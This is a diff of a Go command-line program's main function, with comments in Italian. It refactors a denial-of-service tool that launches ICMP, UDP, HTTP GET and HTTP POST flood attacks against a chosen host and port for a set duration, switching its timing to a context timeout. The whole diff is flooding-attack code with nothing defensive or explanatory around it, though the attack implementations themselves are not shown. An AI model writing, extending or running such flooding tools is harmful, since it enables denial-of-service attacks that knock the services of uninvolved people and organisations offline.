@@ -71,7 +71,7 @@ func main() {
 
 		// Avvia l'attacco ICMP flood
 		wg := &sync.WaitGroup{}
-		ctx, cancelFunc := context.WithCancel(context.Background())
+		ctx, cancelFunc := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)
 
 		attackFunc := func() {
 			err := attacks.SendICMP(rawSocket, dstIp)
@@ -88,12 +88,13 @@ func main() {
 		// Gestione del segnale di terminazione
 		termChan := make(chan os.Signal, 1)
 		signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
+
 		select {
 		case <-termChan:
 			log.Println("received termination signal")
 			cancelFunc()
 			wg.Wait()
-		case <-time.After(time.Duration(*duration) * time.Second):
+		case <-ctx.Done(): // Il contesto scade alla fine della durata
 			log.Printf("Attack finished after %d seconds\n", *duration)
 			cancelFunc()
 			wg.Wait()
@@ -132,7 +133,7 @@ func main() {
 	}
 
 	wg := &sync.WaitGroup{}
-	ctx, cancelFunc := context.WithCancel(context.Background())
+	ctx, cancelFunc := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)
 
 	// Definisci la funzione di attacco in base al tipo di attacco scelto
 	var attackFunc func()
@@ -153,32 +154,16 @@ func main() {
 			}
 		}
 	case "udp-flood":
-		rawSocket, err := core.NewRawSocket(dstIp)
-		if err != nil {
-			log.Fatalf("new raw socket: %v", err)
-		}
-		defer rawSocket.Close()
-
-		dstPort := uint16(*port)
 		attackFunc = func() {
-			err := attacks.SendUDP(rawSocket, dstIp, dstPort)
-			if err != nil {
-				log.Printf("Error in UDP flood: %v", err)
-			}
+			attacks.SendUDPFlood(*host, *port, wg, ctx)
 		}
 	case "http-get-flood":
 		attackFunc = func() {
-			err := attacks.SendHTTPGet(*host, *userAgent)
-			if err != nil {
-				log.Printf("Error in HTTP GET flood: %v", err)
-			}
+			attacks.SendHTTPGet(*host, *userAgent, wg, ctx)
 		}
 	case "http-post-flood":
 		attackFunc = func() {
-			err := attacks.SendHTTPPost(*host, *body, *userAgent)
-			if err != nil {
-				log.Printf("Error in HTTP POST flood: %v", err)
-			}
+			attacks.SendHTTPPost(*host, *body, *userAgent, wg, ctx)
 		}
 	default:
 		log.Fatalf("Unsupported attack type: %s", *attack)
@@ -192,12 +177,13 @@ func main() {
 	// Gestione del segnale di terminazione
 	termChan := make(chan os.Signal, 1)
 	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
+
 	select {
 	case <-termChan:
 		log.Println("received termination signal")
 		cancelFunc()
 		wg.Wait()
-	case <-time.After(time.Duration(*duration) * time.Second):
+	case <-ctx.Done(): // Il contesto scade alla fine della durata
 		log.Printf("Attack finished after %d seconds\n", *duration)
 		cancelFunc()
 		wg.Wait()
